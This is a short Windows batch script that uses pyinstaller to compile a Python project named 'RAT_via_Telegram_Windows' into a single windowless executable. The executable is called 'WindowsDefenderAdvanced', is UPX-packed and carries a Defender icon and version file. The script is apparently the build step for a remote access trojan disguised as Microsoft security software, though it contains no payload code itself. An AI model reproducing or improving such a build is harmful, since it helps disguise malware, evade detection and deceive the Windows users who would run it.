echo off
cd O:\OneDrive - xKx\SoftwareProyect\Python\RAT_via_Telegram_Windows

pyinstaller --clean --distpath "CompiladoEXE"  --upx-dir upx-* --windowed   -F --onefile --icon iconDefender.ico --version-file versionN.txt WindowsDefenderAdvanced.py

:cmd
pause null 
